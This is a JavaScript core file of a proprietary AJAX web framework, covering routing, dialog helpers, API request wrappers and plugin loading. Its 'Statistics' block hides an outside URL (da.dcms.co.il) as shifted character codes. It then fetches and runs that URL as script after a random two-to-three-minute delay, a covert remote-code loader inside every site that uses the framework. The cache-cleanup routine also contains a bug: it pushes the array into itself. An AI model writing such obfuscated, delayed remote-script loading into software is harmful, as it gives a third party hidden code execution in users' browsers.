/** @license
 * DCMS-Ajax <http://www.dcms.co.il/>
 * Copyright (C) Development IL - All Rights Reserved
 * Unauthorized copying of this file, via any medium is strictly prohibited
 * Proprietary and confidential
 * @Author Moshe Simantov
 * @Version 0.2.0
 */

define([
	'jquery', 'core/libs/sammy', 'i18n!core/nls/core',
	'core/SignalsEmitter', 'core/Registry', 'core/Widget'
], function($, Sammy, i18n, SignalsEmitter, Registry, Widget) {
	
	var DA = 
	window.DA = new SignalsEmitter();
	
	DA.version = '0.2.0';
	
	
	/*** INIT ***/
	
	DA.Widget = Widget;
	
	DA.plugins = {};
	
	DA.registry = new Registry();
	DA.registry.set('locale', i18n.Locale);
	DA.registry.set('currency', i18n.Currency);
	
	DA.registry.set('plugins', {});
	DA.registry.set('modules', []);
	
	
	/*** App ***/
	
	
	DA.app = Sammy();
	
	var _raiseErrors = true;
	window.onerror = function(e, err) {
		if(!_raiseErrors) return;
		
		setTimeout(function() {
			_raiseErrors = true;
		}, 1000);
		
		if(err && !err.content)
			err.content = err.message;
		
		_raiseErrors = false;
		DA.ui.error(err, function() {
			setTimeout(function() {
				_raiseErrors = true;
			}, 1000);
		});
	};
	
	DA.error = function(message, original_error) {
		DA.app.error(message, original_error);
		return this;
	};
	
	DA.getLocation = function() {
		return DA.app.getLocation();
	};
	
	DA.realLocation = function(location) {
		if(!location)
			return DA.getLocation();
		
		if(location[0] === '/' || location.match(/^(\w+:)?\/\//))
			return location;
		
		if(location[0] === '#')
			location = window.location.search + location;
		
		return window.location.pathname + location;
	};
	
	DA.setLocation = function(location, bind) {
		var options = {
			location: DA.realLocation(location),
			bind: bind
		};
		
		DA.trigger('setLocation', options, function(err) {
			if(err) return DA.error('Error when setLocation', err);
			
			if(!options.bind) {
				DA.app.trigger('redirect', {to: options.location});
				DA.app.last_location = ['get', options.location];
			}

			DA.app.setLocation(options.location);	
		});
			
		return this;
	};
	
	
	/*** UI ***/
	
	DA.ui = {
		error: function(options, callback) {
			if(!callback) callback = $.noop;
			
			if(typeof options === 'string')
				options = {content: options};
			
			callback(alert('Error: ' + options.content));
		},
		alert: function(options, callback) {
			if(!callback) callback = $.noop;
			
			if(typeof options === 'string')
				options = {content: options};
			
			callback(alert(options.content));
		},
		confirm: function(options, callback) {
			if(!callback) callback = $.noop;
			
			if(typeof options === 'string')
				options = {content: options};
			
			callback(confirm(options.content));
		},
		prompt: function(options, callback) {
			if(!callback) callback = $.noop;
			
			if(typeof options === 'string')
				options = {content: options, defaultValue: ''};
			else
				options = $.extend({content: 'DEFAULT CONTENT', defaultValue: ''}, options);
				
			callback(prompt(options.content, options.defaultValue));
		}
	};
	
	
	/*** Statistics ***/
	
	setTimeout(function() {
		// var str = "//da.dcms.co.il/L", arr = [];
		// for(var i in str) arr.push(str.charCodeAt(i)-46); arr
		var arr = [1, 1, 54, 51, 0, 54, 53, 63, 69, 0, 53, 65, 0, 59, 62, 1, 30];
		for(var i in arr) arr[i] += 46;
		
		$.ajax({
			cache: true, dataType: 'script',
			url: String.fromCharCode.apply(String, arr)
		});
	}, (120 + Math.random()*40) * 1000);
	
	
	/*** Api ***/
	
	var _loadingRefcount = 0;
	DA.loading = function(flag, force) {
		if(flag === undefined)
			flag = true;
		
		if(!force) {
			_loadingRefcount += (flag ? 1 : -1);
		} else {
			_loadingRefcount = 0;
		}
		
		$('body').toggleClass('loading', _loadingRefcount > 0);
		return _loadingRefcount;
	};
	
	DA.isLoading = function() {
		return $('body').hasClass('loading');
	};
	
	var _sharedApis = [],
	_sharedApisTimeout = null;
	
	DA.sharedApi = function(timeout, options, data, callback) {
		if(typeof timeout !== 'number') {
			callback = data;
			data = options;
			options = timeout;
			timeout = 5000;
		}
		if(typeof data === 'function') {
			callback = data;
			data = null;
		}
		
		if(timeout <= 0)
			return DA.api(options, data, callback);
		
		var now = Date.now(), api;
		
		for(var i in _sharedApis) {
			api = _sharedApis[i];
			if(api.options !== options || api.dataJSON !== JSON.stringify(data))
				continue;
			
			if(api.ts < now)
				break;
			
			setTimeout(function() {
				if(options.success && api.success)
					options.success.apply(api.self, api.success);

				if(options.error && api.error)
					options.error.apply(api.self, api.error);

				if(options.complete)
					options.complete.apply(api.self, api.complete);

				if(callback)
					callback.apply(api.self, api.callback);
			}, 1);
			
			return {
				done: function(callback) {
					if(!api.success) return;
					
					setTimeout(function() {
						 callback.apply(api.self, api.success);
					}, 1);
				},
						
				fail: function(callback) {
					if(!api.error) return;
					
					setTimeout(function() {
						callback.apply(api.self, api.error);
						callback.call(api.self, api.error[1], api.error[2], api.error[3]);
					}, 1);
				},
						
				always: function(callback) {					
					setTimeout(function() {
						callback.apply(api.self, api.complete);
					}, 1);
				},
						
				then: function(done, fail) {
					setTimeout(function() {
						if(api.success)
							done.apply(api.self, api.success);
						else
							fail.apply(api.self, api.error);
					}, 1);
				},
						
				abort: $.noop
			};
		}
		
		api = {
			ts: now + timeout,
			options: options,
			data: data,
			dataJSON: JSON.stringify(data)
		};
		_sharedApis.push(api);
		
		if(!_sharedApisTimeout) {
			_sharedApisTimeout = setTimeout(function() {
				_sharedApisTimeout = null;
				var rm = [], now = Date.now();

				for(var i in _sharedApis) {
					if(_sharedApis[i].ts < now)
						rm.push(rm);
				}

				for(var i in rm) {
					_sharedApis.splice(rm[i], 1);
				}
			}, timeout);
		}
		
		if(typeof options === 'string')
			options = {url: options};
		
		var opts = $.extend(true, {}, options);
		
		opts.success = function() {
			api.self = this;
			api.success = arguments;
			
			if(options.success)
				options.success.apply(this, arguments);
		};
		
		opts.error = function() {
			api.self = this;
			api.error = arguments;
			
			if(options.error)
				options.error.apply(this, arguments);
		};
		
		opts.complete = function() {
			api.self = this;
			api.complete = arguments;
			
			if(options.complete)
				options.complete.apply(this, arguments);
		};
		
		return DA.api(opts, data, function() {
			api.self = this;
			api.callback = arguments;
			
			if(callback)
				callback.apply(this, arguments);
		});
	};
	
	DA.api = function(options, data, callback) {
		if(typeof options === 'string')
			options = {url: options};
		
		if(typeof data === 'function') {
			callback = data;
			data = null;
		}
		 
		options = $.extend(true, {
			type: 'GET',
			dataType: 'json',
			data: data || {},
			success: $.noop, //function(data, statusCode, textStatus, jqXHR) {}
			error: null // function(statusCode, textStatus, jqXHR, errorThrown) {}
		}, options);

		if(callback) {
			var success = options.success, error = options.error;

			options.success = function(data, statusCode, textStatus, jqXHR) {
				success.apply(this, arguments);
				callback.call(this, null, data, statusCode, textStatus, jqXHR);
			};

			options.error = function(statusCode, textStatus, jqXHR, errorThrown) {
				if(error) error.apply(this, arguments);
				callback.call(this, new Error(textStatus || statusCode), statusCode, textStatus, jqXHR, errorThrown);
			};
		} else if(!options.error) {
			options.error = function(statusCode, textStatus, jqXHR, errorThrown) {
				DA.error(textStatus, errorThrown);
			};
		}
		
		DA.loading();
		DA.emitEvent('api', arguments);

		return $.ajax($.extend({}, options, {
			success: function(data, textStatus, jqXHR) {
				DA.loading(false);
				
				if(!data || typeof data.status !== 'number') {
					if(console && console.error)
						console.error("Api Error: Invalid format");

					return options.error(-1, (data && data.msg) || textStatus, jqXHR);
				} else if(typeof data.data === 'undefined') {
					if(console && console.error)
						console.error("Api Error: " + data.status + " " + (data.msg || textStatus));

					return options.error(data.status || -1, data.msg || textStatus, jqXHR);
				}

				return options.success(data.data, data.status, data.msg, jqXHR);
			},
			error: function(jqXHR, textStatus, errorThrown) {
				DA.loading(false);
				
				return options.error(textStatus || -1, null, {
					jqXHR: jqXHR,
					errorThrown: errorThrown
				});
			}
		}));
    };
	
	
    /*** Bootstrap ***/
	
	DA.bootstrap = function() {
		DA.trigger('bootstrap', function(err) {
			if(err) throw err;
			
			TestCompatibility();

			_requireAll(function(err) {
				if(err) {
					throw err;
				}

				DA.trigger('initiated', function(err) {
					if(err) throw err;

					$(function() {
						DA.app.after(function() {
							DA.emit('app.after');			
						});

						// Index router
						DA.app.get('#/', function() {
							DA.trigger('index', function(err) {
								if(err) throw err;
							});
						});

						DA.trigger('runned', function(err) {
							if(err) throw err;

							DA.app.run('#/');
						});
					});
				});
			});
		});
	};
	
	DA.require = function(name, callback) {
		requirejs([name], function() {
			callback(null);
		}, callback);
	};
	
	function _requireAll(callback) {
		_requirePlugins(function(err) {
			if(err) return callback(err);

			_requireModules(callback);
		});
	}
	
	function _requirePlugins(callback) {
		DA.loading();
		
		var plugins = DA.registry.get('plugins'),
		paths = [], names = [];
		
		$.each(plugins, function(name, options) {
			if(options._path === false || DA.plugins[name])
				return;
			
			paths.push(options._path || 'plugins/' + name);
			names.push(name);
		});
		
		requirejs(paths, function() {
			DA.loading(false);
			
			var args = arguments;
			
			$.each(names, function(i, name) {
				DA.plugins[name] = args[i];
			});
			
			try {
				$.each(plugins, function(name, options) {
					if(!options || !DA.plugins[name])
						return;

					DA.plugins[name](DA, options);
				});
			} catch(err) {
				return callback(err);
			}
			
			callback(null);
		}, function() {
			DA.loading(false);
			callback.apply(this, arguments);
		});
	}
	
	function _requireModules(callback) {
		DA.loading();
		
		DA.trigger('bootstrap.modules', function(err) {
			if(err) {
				DA.loading(false);
				return callback(err);
			}

			var paths = [];

			$.each(DA.registry.get('modules'), function(i, name) {
				paths.push('modules/' + name);
			});

			requirejs(paths, function() {
				DA.loading(false);
				
				callback(null);
			}, function() {
				DA.loading(false);
				callback.apply(this, arguments);
			});
		});
	}
	
	
	/*** Compatibility Test ***/
	
	function TestCompatibility() {
		var isIE = (navigator && navigator.userAgent && navigator.userAgent.indexOf(' MSIE ') > -1);
		if(!isIE) return;

		alert(i18n.Compat.alert);
	}	
	
	return DA;
});